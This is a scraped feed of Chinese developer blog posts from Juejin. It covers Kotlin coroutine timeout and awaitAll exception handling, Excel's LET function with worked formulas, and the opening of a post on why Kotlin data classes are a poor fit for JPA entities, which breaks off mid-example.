<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// 使用 withTimeout（抛出版）</span>
    <span class="hljs-keyword">try</span> {
        withTimeout(<span class="hljs-number">1000</span>) {
            println(<span class="hljs-string">"Task 1: I have a second to complete."</span>)
            delay(<span class="hljs-number">2000</span>) <span class="hljs-comment">// 会超时</span>
            println(<span class="hljs-string">"Task 1: I finished."</span>) <span class="hljs-comment">// 不会执行</span>
        }
    } <span class="hljs-keyword">catch</span> (e: TimeoutCancellationException) {
        println(<span class="hljs-string">"Task 1 failed: <span class="hljs-subst">${e.message}</span>"</span>)
    }

    <span class="hljs-comment">// 使用 withTimeoutOrNull（非抛出版）</span>
    <span class="hljs-keyword">val</span> result = withTimeoutOrNull(<span class="hljs-number">1000</span>) {
        println(<span class="hljs-string">"Task 2: Trying to complete in 1 second."</span>)
        delay(<span class="hljs-number">2000</span>)
        <span class="hljs-string">"Success"</span>
    }

    <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) {
        println(<span class="hljs-string">"Task 2 timed out and returned null."</span>)
    } <span class="hljs-keyword">else</span> {
        println(<span class="hljs-string">"Task 2 finished with result: <span class="hljs-variable">$result</span>"</span>)
    }
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Task 1: I have a second to complete.
Task 1 failed: Timed out waiting for 1000 ms
Task 2: Trying to complete in 1 second.
Task 2 timed out and returned null.
</code></pre>
<p>实际开发中，withTimeoutOrNull 更常用，可避免额外的 try-catch 嵌套。</p>
<h2 data-id="heading-30">场景十三：等待多个异步任务的异常处理</h2>
<p>当需要等待多个 <code>async</code> 任务完成时，推荐使用 <code>awaitAll()</code>——它遵循“全或无”原则，与 <code>coroutineScope</code> 逻辑一致：若任意一个任务失败，立即取消所有其他任务，并抛出第一个失败的异常。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting multiple async jobs."</span>)
    <span class="hljs-keyword">try</span> {
        coroutineScope {
            <span class="hljs-keyword">val</span> deferred1 = async {
                delay(<span class="hljs-number">1000</span>)
                println(<span class="hljs-string">"Job 1: Success."</span>)
                <span class="hljs-string">"Result 1"</span>
            }

            <span class="hljs-keyword">val</span> deferred2 = async {
                delay(<span class="hljs-number">500</span>)
                println(<span class="hljs-string">"Job 2: Failing!"</span>)
                <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Job 2 Error"</span>)
            }

            <span class="hljs-comment">// 等待所有任务完成，任意失败则立即抛出异常</span>
            <span class="hljs-keyword">val</span> results = awaitAll(deferred1, deferred2)
            println(<span class="hljs-string">"All jobs finished: <span class="hljs-variable">$results</span>"</span>) <span class="hljs-comment">// 不会执行</span>
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        println(<span class="hljs-string">"Caught exception in awaitAll: <span class="hljs-subst">${e.message}</span>"</span>)
    }
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting multiple async jobs.
Job 2: Failing!
Caught exception in awaitAll: Job 2 Error
</code></pre>
<p>可以看到，Job 2 失败后，<code>awaitAll()</code> 立即抛出异常，Job 1 被取消（其延迟 1000ms 的任务未完成，因此“Job 1: Success.” 未打印）。</p>
<h2 data-id="heading-31">总结</h2>
<p>以上场景覆盖了协程异常处理的核心场景和最佳实践。</p>
<p><em>屏幕前的你，现在强的可怕！</em></p>
<p>异常处理的核心原则是：利用结构化并发的层级特性，让异常处理逻辑紧跟异常发生位置，根据任务关联性选择合适的作用域（<code>coroutineScope</code>/<code>supervisorScope</code>），必要时用 <code>CoroutineExceptionHandler</code> 兜底。</p>
<p><em>实在不行，古法捕获！</em></p>
<p>掌握这些逻辑，就能让协程的异常处理既安全又优雅。</p>
<p><em>我把这篇文章甩给我的同事，我相信他以后绝对不会问我异常处理的问题了。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[excel表达式中的let语法]]></title>    <link>https://juejin.cn/post/7597266141913006126</link>    <guid>https://juejin.cn/post/7597266141913006126</guid>    <pubDate>2026-01-21T00:27:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597266141913006126" data-draft-id="7597258378590978058" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="excel表达式中的let语法"/> <meta itemprop="keywords" content="数据可视化"/> <meta itemprop="datePublished" content="2026-01-21T00:27:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="自由生长2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            excel表达式中的let语法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    自由生长2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:27:47.000Z" title="Wed Jan 21 2026 00:27:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>excel表达式中的let有一种局部声明式编程的感觉，还是很好用的。let表达式中声明的所有变量可以方便的自由使用，多次使用，声明过的都可以反复使用，很好用，最后不输出也没关系。</p>
<p>之前从没深入使用过Excel,然而工作中用到了表格处理，学习浪费了很长时间，因此在这里记录一下。</p>
<p>在Excel中，<strong>LET函数</strong> 用于定义变量（名称）并在公式中重复使用，从而<strong>简化复杂公式、提高可读性和计算效率</strong>。</p>
<hr/>
<h2 data-id="heading-0"><strong>1. 语法</strong></h2>
<pre><code class="hljs language-excel" lang="excel">=LET(name1, value1, [name2, value2], …, calculation)
</code></pre>
<ul>
<li><strong>name1</strong>：变量的名称（不能是单元格引用或数字开头）。</li>
<li><strong>value1</strong>：分配给该变量的值或表达式。</li>
<li>可以定义多个变量（最多 126 对名称/值）。</li>
<li><strong>calculation</strong>：使用已定义变量进行计算的最终表达式。</li>
</ul>
<hr/>
<h2 data-id="heading-1"><strong>2. 主要用途</strong></h2>
<h3 data-id="heading-2"><strong>（1）避免重复计算，提高效率</strong></h3>
<p>例如：用公式提取字符串的姓和名，并合并成“姓,名”格式。</p>
<p><strong>不用 LET</strong>（重复使用 LEFT 和 RIGHT）：</p>
<pre><code class="hljs language-excel" lang="excel">=LEFT(A1, FIND(" ", A1)-1) &amp; "," &amp; RIGHT(A1, LEN(A1)-FIND(" ", A1))
</code></pre>
<p>这里 <code>FIND(" ", A1)</code> 出现了两次，Excel 会计算两次。</p>
<p><strong>用 LET</strong>：</p>
<pre><code class="hljs language-excel" lang="excel">=LET(
    fullName, A1,
    spacePos, FIND(" ", fullName),
    firstName, LEFT(fullName, spacePos-1),
    lastName, RIGHT(fullName, LEN(fullName)-spacePos),
    firstName &amp; "," &amp; lastName
)
</code></pre>
<p><code>spacePos</code> 只计算一次，公式更清晰。</p>
<hr/>
<h3 data-id="heading-3"><strong>（2）让复杂公式更易读</strong></h3>
<p>例如：判断一个数值是否在某一范围内，并返回文字说明。</p>
<p><strong>普通公式</strong>（较难直接理解中间部分）：</p>
<pre><code class="hljs language-excel" lang="excel">=IF(AND(A1&gt;=80, A1&lt;=100), "优秀", IF(AND(A1&gt;=60, A1&lt;80), "合格", "不合格"))
</code></pre>
<p><strong>使用 LET</strong>：</p>
<pre><code class="hljs language-excel" lang="excel">=LET(
    score, A1,
    isExcellent, AND(score&gt;=80, score&lt;=100),
    isPass, AND(score&gt;=60, score&lt;80),
    IF(isExcellent, "优秀", IF(isPass, "合格", "不合格"))
)
</code></pre>
<p>变量名直接表达含义，便于维护。</p>
<hr/>
<h2 data-id="heading-4"><strong>3. 实际案例</strong></h2>
<h3 data-id="heading-5"><strong>案例1：提取括号内的文本</strong></h3>
<p>A1 单元格内容：<code>"产品A (型号123)"</code><br/>
目标：提取 <code>型号123</code>。</p>
<p><strong>用 LET</strong>：</p>
<pre><code class="hljs language-excel" lang="excel">=LET(
    text, A1,
    openPos, FIND("(", text),
    closePos, FIND(")", text),
    MID(text, openPos+1, closePos-openPos-1)
)
</code></pre>
<hr/>
<h3 data-id="heading-6"><strong>案例2：多条件统计</strong></h3>
<p>统计区域 <code>B2:B100</code> 中大于平均值且小于最大值的个数。</p>
<p><strong>不用 LET</strong>：</p>
<pre><code class="hljs language-excel" lang="excel">=COUNTIFS(B2:B100, "&gt;"&amp;AVERAGE(B2:B100), B2:B100, "&lt;"&amp;MAX(B2:B100))
</code></pre>
<p>这里 <code>AVERAGE</code> 和 <code>MAX</code> 可能被重复计算（如果用在多个单元格且数据量大时）。</p>
<p><strong>用 LET</strong>：</p>
<pre><code class="hljs language-excel" lang="excel">=LET(
    data, B2:B100,
    avg, AVERAGE(data),
    maxVal, MAX(data),
    COUNTIFS(data, "&gt;"&amp;avg, data, "&lt;"&amp;maxVal)
)
</code></pre>
<p>效率更高，特别是数据量大或公式复杂时。</p>
<hr/>
<h2 data-id="heading-7"><strong>4. 注意事项</strong></h2>
<ol>
<li><strong>变量作用域</strong>：仅在当前公式内有效，不会影响工作簿名称管理器。</li>
<li><strong>版本要求</strong>：需要 <strong>Excel 365 或 Excel 2021</strong> 及以上版本，旧版本不支持。</li>
<li><strong>命名限制</strong>：变量名不能与单元格地址相同（如 <code>A1</code>、<code>B2</code>），不能以数字开头。</li>
<li><strong>性能提升</strong>：如果某个值在公式中被多次使用，用 LET 可避免重复计算，提升效率。</li>
</ol>
<hr/>
<h2 data-id="heading-8"><strong>5. 优点总结</strong></h2>
<ul>
<li><strong>可读性</strong>：用有意义的变量名替代冗长中间步骤。</li>
<li><strong>可维护性</strong>：修改变量值只需改一处。</li>
<li><strong>性能</strong>：减少重复计算。</li>
<li><strong>调试方便</strong>：可在 calculation 部分逐步测试中间变量。</li>
</ul>
<hr/>
<p>let有一种局部声明式编程的感觉，还是很好用的。let表达式中声明的所有变量可以方便的自由使用，多次使用，声明过的都可以反复使用，很好用，最后不输出也没关系。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin 遇上 JPA：当「优雅」撞上「反射」]]></title>    <link>https://juejin.cn/post/7597251197426663450</link>    <guid>https://juejin.cn/post/7597251197426663450</guid>    <pubDate>2026-01-21T00:32:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597251197426663450" data-draft-id="7597266141913022510" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin 遇上 JPA：当「优雅」撞上「反射」"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-01-21T00:32:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="黄林晴"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin 遇上 JPA：当「优雅」撞上「反射」
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    黄林晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:32:34.000Z" title="Wed Jan 21 2026 00:32:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>你以为用 Kotlin 写 JPA 实体很简单？data class 一把梭？抱歉，这可能是你踩坑的开始。</p>
</blockquote>
<h2 data-id="heading-0">开篇：一个让人困惑的现象</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 看起来完美的代码</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(
    <span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
    <span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0</span>,
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">val</span> email: String
)
</code></pre>
<p>这段代码能编译，能运行，但它<strong>埋了至少 4 个雷</strong>。</p>
<p>很多从 Java 转 Kotlin 的开发者，第一反应就是用 <code>data class</code> 来写实体类——毕竟 Kotlin 官方都说它适合做「数据载体」。但 JPA 的世界观和 Kotlin 完全不同。</p>
<p>今天我们就来聊聊：<strong>为什么 Kotlin 的「优雅」在 JPA 面前会失效？</strong></p>
<hr/>
<h2 data-id="heading-1">核心矛盾：两种设计哲学的碰撞</h2>

























<table><thead><tr><th>Kotlin 的信仰</th><th>JPA 的需求</th></tr></thead><tbody><tr><td>不可变性 (<code>val</code>)</td><td>可变性（反射修改字段）</td></tr><tr><td>空安全 (<code>String</code> vs <code>String?</code>)</td><td>反射绕过空检查</td></tr><tr><td><code>data class</code> 简洁</td><td>需要非 final 类支持代理</td></tr><tr><td>构造函数初始化</td><td>无参构造 + 反射赋值</td></tr></tbody></table>
<p>JPA 规范（Jakarta Persistence）明确要求实体类必须：</p>
<ul>
<li>提供<strong>无参构造函数</strong>（用于反射实例化）</li>
<li>属性<strong>不能是 final</strong>（支持脏检查和懒加载代理）</li>
<li>类<strong>不能是 final</strong>（支持生成代理子类）</li>
</ul>
<p>而 Kotlin 的 <code>data class</code> 恰好<strong>全部违反</strong>——它默认是 final 的，属性通常用 <code>val</code>，也没有无参构造。</p>
<hr/>
<h2 data-id="heading-2">陷阱一：data class 不是实体类的正确选择</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 错误示范</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span>(
    <span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
    <span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0</span>,
    <span class="hljs-keyword">val</span> name: String
)
</code></pre>
<p><strong>问题</strong>：</p>
<ol>
<li><code>data class</code> 是 final 的，Hibernate 无法生成代理类</li>
<li>懒加载会失效</li>
<li><code>equals()</code> / <code>hashCode()</code> 基于所有属性，而非主键</li>
</ol>
<p><strong>正确做法</strong>：使用普通 class</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ✅ 正确示范</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> {
    <span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
    <span class="hljs-keyword">var</span> id: <span class="hljs-built_in">Long</span>? = <span class="hljs-literal">null</span>

    <span class="hljs-keyword">var</span> name: String = <span class="hljs-string">""</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-3">陷阱二：val 看似能用，实则是定时炸弹</h2>
<p>你可能发现用 <code>val</code> 也能正常运行：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
    <span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Long</span>? = <span class="hljs-literal">null</span>  <span class="hljs-comment">// 看起来没问题？</span>

    <span class="hljs-keyword">val</span> name: String = <span class="hljs-string">""</span>
}
</code></pre>
<p><strong>真相</strong>：JPA 通过反射<strong>强行修改</strong> <code>val</code> 字段，这违反了 Kotlin 的不可变性契约。</p>
<p>更危险的是：<strong>Java 的 JEP 500 提案正在考虑限制反射修改 final 字段</strong>。一旦实施，你的代码会直接崩溃。</p>
<p><strong>结论</strong>：所有实体属性都应该用 <code>var</code>，不要心存侥幸。</p>
<hr/>
<h2 data-id="heading-4">陷阱三：主键必须是可空类型</h2>
<p>这是很多人忽略的细节：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 错误</span>
<span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
<span class="hljs-keyword">var</span> id: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0</span>

<span class="hljs-comment">// ✅ 正确</span>
<span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
<span class="hljs-keyword">var</span> id: <span class="hljs-built_in">Long</span>? = <span class="hljs-literal">null</span>
</code></pre>
<p><strong>为什么？</strong></p>
<p>JPA 规范规定：主键为 <code>null</code> 表示「尚未持久化」。如果你用 <code>Long = 0</code>，JPA 无法区分：</p>
<ul>
<li>这是一个新实体（应该 INSERT）</li>
<li>还是 ID 恰好为 0 的已有实体（应该 UPDATE）</li>
</ul>
<hr/>
<h2 data-id="heading-5">陷阱四：Kotlin 的空安全被反射「架空」</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span> <span class="hljs-meta">@GeneratedValue</span>
    <span class="hljs-keyword">var</span> id: <span class="hljs-built_in">Long</span>? = <span class="hljs-literal">null</span>

    <span class="hljs-keyword">var</span> name: String = <span class="hljs-string">""</span>  <span class="hljs-comment">// 非空类型，应该安全？</span>
}
</code></pre>
